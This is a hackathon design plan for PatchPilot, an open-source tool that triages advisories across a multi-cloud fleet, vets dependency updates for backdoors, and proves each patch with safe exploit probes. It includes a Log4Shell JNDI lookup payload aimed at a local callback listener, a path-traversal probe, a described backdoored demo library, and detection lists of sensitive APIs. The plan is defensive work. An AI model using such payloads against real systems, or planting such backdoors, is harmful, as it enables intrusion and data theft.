# PatchPilot — hackathon plan

InfraHack: AI for Cloud Infrastructure.
Constraints: 4 people, about 10 hours, open-source components only, hackathon servers with 128 GB RAM.

## One-line pitch

A company with 300 repositories on three clouds gets one advisory. PatchPilot finds every running workload that carries the package, works out which ones can actually be exploited where they run, checks that the fix itself is not poisoned, rolls it out per workload (or shields the app when no fix exists), and **proves** each result by re-running the exploit — the same way on AWS, Google Cloud or a European cloud, with every decision made by an open model on your own hardware.

## Who it is for

Platform and security teams at companies that run many services, written in several languages, across more than one cloud. Their problem is not finding CVEs; it is that one advisory turns into hundreds of tickets across teams, and nobody knows which five matter.

Three consequences for the design:

1. **The unit of work is the fleet, not the app.** One advisory in, a ranked list of affected workloads out, each with its own verdict and its own rollout.
2. **Nothing may be specific to one codebase, one language or one cloud.** Everything that touches a repository, a package ecosystem or a deployment target sits behind a small driver interface.
3. **No cloud is privileged.** PatchPilot talks to clouds through open, portable layers (the Kubernetes API, OpenTofu state, OCI images), so a hyperscaler and a European provider are the same kind of target. PatchPilot itself runs anywhere, including fully inside a sovereign environment.

## What makes it different

Scanning and version-bump bots already exist (Trivy, Dependabot, Renovate). These five points are what the judges have not seen, so the demo is built around them:

1. **Proof, not scores.** Every action is bracketed by a safe exploit check: VULNERABLE before, SAFE after.
2. **Same CVE, different verdict per workload.** The internet-facing service is patched now; the internal batch job with the same library is queued, with the reason written down. Prioritisation comes from where and how the workload runs, not from the CVSS score.
3. **It does not trust the fix either.** An agent that auto-installs updates is an ideal delivery vehicle for a supply-chain attack. Before any dependency bump, PatchPilot diffs the old and new versions of that dependency and reviews what changed. A package version is vetted once and the verdict is reused across every repository that needs it.
4. **AI proposes, deterministic checks dispose.** The LLM never touches production directly. Its output passes schema validation, a policy gate, `nginx -t`, a canary and the exploit check.
5. **Cloud-neutral and sovereign by construction.** Open-source tools, an open-weight model, a local feed, no external API. The clouds are targets, never dependencies.

## Cloud and platform coverage

Coverage comes from three portable layers rather than one integration per provider:

| Layer | What PatchPilot gets from it | Covers |
|-------|------------------------------|--------|
| Kubernetes API | Workloads, images, exposure (Service / Ingress / Gateway), rollout, rollback. Provider and region from `node.spec.providerID` and topology labels | Any conformant cluster |
| OCI image + labels | SBOM of what is really running; `org.opencontainers.image.source` links the image back to its repository | Any registry |
| OpenTofu / Terraform state (JSON) | Network exposure outside the cluster: load balancers, security groups, firewall rules | Any provider with an OpenTofu provider |

| Platform | How it is reached | Hackathon status |
|----------|-------------------|------------------|
| Leaseweb (hackathon servers) | Kubernetes driver on k3s | **Live in the demo** |
| AWS (EKS), Google Cloud (GKE), Azure (AKS) | Kubernetes driver, unchanged | Second cluster in the demo stands in for a hyperscaler; a real EKS/GKE kubeconfig is a drop-in if someone has an account |
| OVHcloud, Scaleway, Hetzner, IONOS, STACKIT, Open Telekom Cloud, Exoscale | Kubernetes driver (managed or self-run Kubernetes) | Works by design, not tested on the day |
| OpenStack and Apache CloudStack private clouds | Kubernetes driver; exposure through the OpenTofu state reader | Roadmap for the state reader |
| VMs and bare metal without Kubernetes | Compose driver over the Docker API | Should (also the fallback, see timeline) |
| Cloud WAFs, native cloud APIs | Extra mitigation and context drivers | Roadmap |

Say this openly in the talk: one environment is real European infrastructure, the hyperscaler one is simulated unless we attach a real cluster. The claim we can defend is that the driver uses nothing provider-specific. Before putting provider names on a slide, check that each one offers what the table says.

OpenTofu (MPL-2.0) is named rather than Terraform because Terraform's current licence is not open source. The state format is the same.

## Driver interfaces

Four small Python protocols. The core pipeline only sees these. Agreeing them in hour 0 is what lets four people work in parallel.

| Interface | Methods (sketch) | Built today | Roadmap |
|-----------|------------------|-------------|---------|
| `Source` | `list_repos()`, `checkout(repo)`, `propose_change(repo, branch, files, evidence)` | Plain git: a branch and a commit carrying the evidence | Pull/merge requests on GitHub, GitLab, Gitea/Forgejo |
| `Ecosystem` | `detect(path)`, `fetch(pkg, version)`, `bump(path, pkg, version)`, `version_in_range()`, `sensitive_patterns` | Java (jars), Python (PyPI) | npm, Go, container base images |
| `Target` | `list_workloads()`, `exposure(workload)`, `deploy_canary()`, `promote()`, `rollback()`, `apply_mitigation()` | Kubernetes; Compose | Nomad, cloud-native deploy APIs |
| `Probe` | `check(url) → VULNERABLE or SAFE` | One per demo advisory | Nuclei templates as a probe source |

Configuration: one `fleet.yaml` lists sources and targets (kubeconfig contexts). A repository may carry an optional `.patchpilot.yaml` (health path, policy overrides); without it, defaults apply. No per-repository setup is required to be discovered.

Deployment shape: for the hackathon everything runs in one process with several kubeconfig contexts. For a real company the same `Target` driver runs as a small runner inside each cluster or account and dials out to the control plane, so no inbound access or central cloud credentials are needed. This is a slide, not code.

## Scope for 10 hours

| Priority | Item | Status |
|----------|------|--------|
| Must | Fleet of 3 services, 2 languages, 2 environments, discovered automatically | in |
| Must | `log4shell` across the fleet: exposed service patched and proven VULNERABLE → SAFE, internal one deprioritised with a reason | in |
| Must | `trojan` on the Python service: the proposed fix contains a backdoor, the vetter blocks it | in |
| Must | Fleet dashboard: workloads by environment, decision log, AI explanations | in |
| Should | `zeroday` follow-on: with the fix blocked, an nginx mitigation is applied after approval | in |
| Should | `badupdate`: canary fails, automatic rollback | in (nearly free once the canary exists) |
| Should | Compose driver as a second target type | in if the Kubernetes driver is done by hour 5 |
| Could | Forge pull requests (Gitea), OpenTofu state reader, npm ecosystem | only if ahead at hour 6 |
| Cut | cosign, live OSV query, OPA, runner/control-plane split, cloud WAFs | roadmap slide |

If things slip, drop from the bottom. The first four rows are the demo.

## Open-source stack

| Component | Tool | Licence |
|-----------|------|---------|
| Agent / API | Python, FastAPI, Pydantic | PSF, MIT, MIT |
| Target drivers | Kubernetes Python client, Docker SDK for Python | Apache-2.0 |
| Clusters | k3s via k3d, local registry (`registry:2`) | Apache-2.0, MIT, Apache-2.0 |
| Decision log | SQLite | public domain |
| SBOM | Syft | Apache-2.0 |
| LLM runtime | Ollama | MIT |
| Model | Qwen2.5 (7B / 14B / 32B), or Mistral Nemo 12B as a European option | Apache-2.0 |
| Gateway / virtual patch | nginx | BSD-2-Clause |
| Image builds | Docker Engine (not Docker Desktop) | Apache-2.0 |
| Demo services | OpenJDK + Apache Log4j; Python standard library | GPL-2.0 with Classpath Exception, Apache-2.0; PSF |
| Dashboard | plain HTML + JS, served by FastAPI | — |

Note on the model: Llama 3.1 ships under Meta's community licence, which is not an open-source licence. Other sizes of Qwen2.5 than those listed carry a different licence. Confirm the licence on the model card when you pull it.

## Architecture

```
            ┌───────────────────────── PatchPilot (one process) ─────────────────────────┐
 browser ─► │ core pipeline: discover → inventory → match → triage → rank → vet → gate → act │
            │   ├─ syft ─────► SBOM per image        ├─ ollama ──► triage JSON, diff review   │
            │   ├─ feed/ ────► advisories (OSV)      ├─ policy.yaml ► auto | approve | block  │
            │   └─ sqlite ───► decision log          └─ vet cache ► verdict per pkg@version   │
            │                                                                            │
            │   Source drivers      Ecosystem drivers      Target drivers      Probes    │
            │   git                 java, python           kubernetes, compose           │
            └───────┬──────────────────────┬───────────────────────┬──────────────────────┘
                    │                      │                       │
              repos/ (3 git repos)   artifacts/ (upstream)   kubeconfig contexts
                                                                   │
              ┌────────────────────────────────────┬───────────────┴────────────────────┐
              │ cluster "hyperscaler" (stand-in)   │ cluster "eu" (Leaseweb server)     │
              │  gateway(nginx) ─► orders-java     │  gateway(nginx) ─► billing-py      │
              │     public, log4j 2.14.1           │     public, acme-authutils 1.0.0   │
              │                                    │  reports-java (no route in)        │
              │                                    │     internal, log4j 2.14.1         │
              └────────────────────────────────────┴────────────────────────────────────┘
                                 callback listener (records JNDI connections)
```

Simplifications that save hours:

- **No package managers on the network.** `artifacts/`, filled once in hour 0, acts as the upstream for both ecosystems. Java services are compiled with `javac` against `lib/*.jar` (no Maven). The Python service installs with `pip install --no-index --find-links`. A bump means the ecosystem driver places the vetted artifact and edits the pin; builds take seconds and can only contain reviewed artifacts.
- **The build is ecosystem-agnostic.** Every repository has a Dockerfile; the core only runs `docker build`, pushes to the local registry and hands the image to the target driver.
- **Each exposed service has its own small nginx gateway** (a Deployment with a ConfigMap). Virtual patches go there, so mitigation does not depend on any provider's ingress or WAF.

## Pipeline

1. **Discover** — each `Target` lists its workloads. Image label → repository; `providerID` → provider and region; Service / Ingress → `internet_exposed`. These are facts, not model output.
2. **Inventory** — `syft <image> -o json` per distinct image. One tool for all ecosystems.
3. **Watch** — mock feed in `feed/*.json`, in OSV format so a live OSV query can be added later without changing the parser.
4. **Match** — package + version range, using the ecosystem driver's version comparison. Output is fleet-wide: `CVE-2021-44228 → orders-java@hyperscaler, reports-java@eu`.
5. **Triage (LLM), per workload** — input: advisory, grep hits for the package in that repository's source, gateway config, and the exposure facts from step 1. Output through Ollama structured output with the Pydantic schema:
   `affected, reachable, severity_for_this_workload, recommended_action, mitigation_pattern, explanation`.
   `patch_available`, `fixed_version` and `internet_exposed` come from the advisory and the target, not the model. Retry once on invalid output, then fall back to a cached result.
6. **Rank** — reachable workloads first, most critical first among them; within the same severity, internet-exposed first. Unreachable workloads come last whatever their severity. When several advisories are waiting, the most severe runs first, and the feed is read again after every run so a critical advisory that arrives mid-run goes next. The dashboard shows the order, the reason and each run's severity.
7. **Vet the update** — once per `package@version`, cached by SHA-256 and reused for every workload. Produces `clean | unreviewed | suspicious | malicious` with evidence; `unreviewed` means the model did not answer for every file it had to review, and is never patched without a human.
8. **Policy gate** — plain Python over a fleet `policy.yaml` with optional per-repository overrides. Defaults: patch + `clean` → `auto`; `suspicious` → `needs_approval`; `malicious` → `block`; `unreviewed` → `needs_approval`; mitigation → `needs_approval`; not reachable → ignored on internal workloads, queued on internet-exposed ones. A repository can only tighten the fleet policy.
9. **Act, per workload**
   - *Patch:* ecosystem driver bumps the dependency → `Source` commits it on a branch with the evidence → build and push → target deploys a canary → `/health` + probe → promote → remove the old version. On any failure the canary is removed, live traffic is untouched and the reason is logged.
   - *Mitigate:* fill the rule template with the LLM's pattern → `nginx -t` in a throwaway container → target applies it to the gateway → probe must now be blocked.
10. **Prove and report** — every step is a row in SQLite keyed by workload, repository, environment and provider. Each closed item records its proof level: **exploit probe** (strongest), or **re-scan + health** where no probe exists for that advisory. The dashboard polls the log.

## Supply-chain vetting (`agent/vetter.py`)

Runs on the exact artifact the build would use. Nothing from the artifact is executed. The flow is shared; the ecosystem driver supplies how to unpack and what to look for.

1. **Fetch** the current and proposed versions from `artifacts/` into a quarantine directory and unpack them.
2. **Deterministic checks** — cheap, reliable, and they tell the LLM where to look:
   - SHA-256 matches the checksum recorded for that version.
   - Shipped artifact vs. source: for Java, every class in the binary jar has a matching source file; for Python, the wheel's files match the sdist. Code present only in the shipped artifact is how the xz backdoor hid.
   - Newly introduced sensitive APIs in the diff, from the driver's list. Java: `Runtime.exec`, `ProcessBuilder`, `Socket`, `URLClassLoader`, `defineClass`, `System.getenv`, new static initialisers. Python: `subprocess`, `socket`, `os.environ`, `eval` / `exec`, `urllib`, import-time side effects, and anything new in `setup.py`. Both: long base64 strings.
   - New dependencies bundled or required by the new version.
3. **LLM review** — unified diff of old vs. new sources (Python `difflib`), one chunk per file. Flagged and newly added files go first, with a time budget (about 60 seconds total). Per chunk the model returns `{ suspicious, category, evidence_lines, explanation }`, answering one question: *is this change consistent with a fix for this advisory, or does it add unrelated behaviour?*
4. **Verdict** — checksum mismatch, artifact-only code, or a high-confidence LLM finding → `malicious`; soft flags only → `suspicious`; otherwise `clean`. File, lines and explanation go to the decision log and the dashboard.
5. **Pin and cache** — only on `clean` (or after human approval) is the artifact released to builds. The verdict is stored against its SHA-256, so the next repository needing the same version gets the answer instantly.

Limits to state openly in the talk: this is a tripwire, not a proof. A reviewer model can miss a well-hidden backdoor, and a large diff is only partly reviewed within the budget — the log4j 2.14.1 → 2.17.1 diff is big, so there the deterministic flags decide which files the model sees. It is still far more review than auto-update tools do today, and the canary and exploit check sit behind it.

## Demo fleet and scenarios

| Workload | Language | Environment | Exposure | Carries |
|----------|----------|-------------|----------|---------|
| `orders-java` | Java | `hyperscaler` | Public through its gateway | log4j-core 2.14.1 |
| `reports-java` | Java | `eu` | Internal, no route in | log4j-core 2.14.1 |
| `billing-py` | Python | `eu` | Public through its gateway | acme-authutils 1.0.0 |

| Scenario | Advisory | Expected result |
|----------|----------|-----------------|
| `log4shell` | CVE-2021-44228, fix 2.17.1 | Two workloads match. `orders-java`: vet clean, auto-patch, canary passes, promote, probe VULNERABLE → SAFE. `reports-java`: same CVE, not exposed, queued with a reason; the vet verdict is already cached for when it is patched |
| `trojan` | Mock advisory for `acme-authutils` 1.0.0, "fix" 1.0.1 | Vetter finds new import-time code that reads environment variables and opens a socket. Verdict `malicious`, patch blocked, nothing built |
| `zeroday` | Same advisory, now with no trusted fix | Approval requested, nginx rule applied to the `billing-py` gateway, probe blocked with 403 |
| `badupdate` | Mock fix whose build fails `/health` | Canary fails, automatic rollback, old version still serving |

`trojan` followed by `zeroday` is one story: the fix is poisoned, so PatchPilot refuses it and shields the service instead.

`acme-authutils` is a tiny Python library written for the demo. Version 1.0.0 has a real but harmless flaw: a header value is used in a file path without checking for `..`. A script builds 1.0.0 and the tampered 1.0.1 into `artifacts/`. Because it is small, the diff fits in one LLM call and the result is reliable on stage. Its backdoor would only contact the local `callback` listener, and it is never built into an image or run.

Probes, both safe and aimed only at the demo workloads:

- *log4shell:* send `X-Api-Version: ${jndi:ldap://callback:1389/x}` through the gateway; the callback listener records TCP connections. A connection means vulnerable. No payload is served, so there is no code execution.
- *acme-authutils:* send the traversal header asking for a marker file placed for the purpose; the marker text in the response means vulnerable.

## Team split (4 people)

| Track | Owner | Builds |
|-------|-------|--------|
| A — Fleet | person 1 | Three demo repositories with Dockerfiles and gateways, k3d clusters + registry, manifests, callback listener, both probes, `acme-authutils` (clean + tampered), `reset_demo.sh` |
| B — AI | person 2 | Model benchmark, `feed.py`, `matcher.py`, `triage.py`, LLM half of `vetter.py`, prompt tuning, triage cache |
| C — Drivers | person 3 | `Target` interface and Kubernetes driver (discover, exposure, canary, promote, rollback, mitigation), then the Compose driver |
| D — Core + story | person 4 | `Source` (git) and `Ecosystem` (Java, Python) drivers, deterministic half of `vetter.py`, `db.py`, `policy.py`, pipeline runner, fleet dashboard, slides |

Track D is the heaviest. B takes the dashboard or the vetter checks from D once triage returns valid JSON.

## Timeline

| Hour | Everyone | Checkpoint |
|------|----------|------------|
| 0–1 | Server setup (Docker, k3d, Ollama, Syft), pull model and base images, fill `artifacts/`, create the git repo. **Agree the interfaces**: the four driver protocols, triage JSON, vet JSON, decision-log table | Everyone can SSH in; two empty clusters answer `kubectl get nodes` |
| 1–3 | Tracks in parallel. B and D work against hard-coded stub data until A and C deliver | **Hour 3:** all three services run in their clusters; log4shell probe prints VULNERABLE; `list_workloads()` returns the fleet with exposure; triage returns valid JSON; dashboard shows stub rows. **If the clusters are not serving traffic by now, switch to the Compose driver** (two Compose projects as the two environments) and keep Kubernetes for the slide |
| 3–6 | A: tampered library, reset script. B: diff review prompt. C: canary, promote, rollback. D: wire real modules into the runner, approve button | **Hour 6:** `log4shell` runs across the fleet from one command, with two different verdicts |
| 6–8 | Integrate `trojan`, then `zeroday`, then `badupdate`. Fix what breaks. Decide on the Could items | **Hour 8: feature freeze** |
| 8–9 | Three full rehearsals with `reset_demo.sh` in between. Record a backup video of a good run | Demo is repeatable |
| 9–10 | Slides, buffer for surprises | — |

Rule for the day: at each checkpoint, whatever is not working gets mocked or cut, not debugged past the hour.

## Model choice

Person B decides in hour 0–1 by measuring: run the real triage prompt on Qwen2.5 7B, 14B and 32B (and Mistral Nemo if time allows), record response time and whether the JSON is correct. Pick the largest that answers in under about 30 seconds. Without a GPU, expect the 32B model to be too slow for a live demo and the 14B to be the practical choice. Triage now runs once per workload, so per-call time matters more than before. The model name lives in config.

## Risks

| Risk | Mitigation |
|------|------------|
| Kubernetes setup eats the morning | Hard switch to the Compose driver at hour 3. The interface is the same, so nothing above it changes |
| Abstractions cost more than they return in 10 hours | Interfaces stay at four protocols with only the methods the demo calls. Two implementations each at most; everything else is a table on a slide |
| "Multi-cloud" claim challenged by judges | Say what is real (Leaseweb) and what is simulated. Show that the driver reads only standard Kubernetes fields. Attach a real cluster if anyone has an account |
| LLM slow or wrong on stage | Cached triage and vet results per advisory and workload; rehearse once with the cache off to know the real behaviour |
| Diff review misses the backdoor | The deterministic checks alone already flag the tampered library; the LLM adds the explanation |
| Integration eats the last hours | Interfaces fixed in hour 0, stubs from hour 1, feature freeze at hour 8 |
| nginx rule only covers named fields | Each rule covers exactly the fields the service reads. Block `${` rather than the literal `jndi` to resist obfuscation |
| Agent holds cluster-admin kubeconfigs and the Docker socket | Say in the talk that it is a prototype shortcut; production uses a namespaced role per runner |
| Server has no outbound internet | Everything is pulled in hour 0; the demo needs no network |
| Dirty state between runs | `reset_demo.sh` redeploys the original images, restores the repositories, clears mitigations, the callback log, the vet cache and the DB |

## Presentation (5 minutes)

1. **Problem (30s)** — Log4Shell: a fix existed within days, organisations took months, because one advisory meant hundreds of services across teams and clouds. And the tools that update fastest are the ones attackers now target.
2. **Live: the fleet (20s)** — dashboard: three services, two languages, two environments, discovered with no per-repository setup.
3. **Live: log4shell (90s)** — probe: VULNERABLE. Trigger. Two workloads match; the public one is triaged, vetted, canaried and promoted; probe: SAFE. The internal one is queued, with the reason on screen.
4. **Live: trojan → zeroday (75s)** — an advisory arrives for the Python service with a "fix". The agent refuses it and shows the exact lines that open a socket and read the environment. Click Approve on the mitigation; probe blocked.
5. **badupdate (10s)** — show the logged rollback from the dashboard.
6. **How and why (60s)** — architecture slide with the four driver interfaces, the coverage table, the "AI proposes, checks dispose" chain, all open source with the model on our own server. Roadmap: forge pull requests, runner per cluster, OpenTofu state, image signing, live OSV feed.

Mapping to the criteria: innovation = exploit-verified closed loop, per-workload verdicts and vetting the fix itself; applicability = works across codebases and clouds through portable interfaces, shown on real infrastructure; technical complexity = fleet discovery, SBOM, LLM triage, diff review, canary, policy; clarity = one before/after signal readable from the back of the room.

## Open questions

- Do the servers have GPUs? (decides model size)
- Do the servers have outbound internet, and can all four people SSH into the same one?
- Can we run k3d (Docker with privileged containers) on the servers? If not, start on the Compose driver from hour 1.
- Does anyone have an AWS or Google Cloud account with a cluster we may use for ten minutes? Optional; it turns the stand-in environment into a real one.
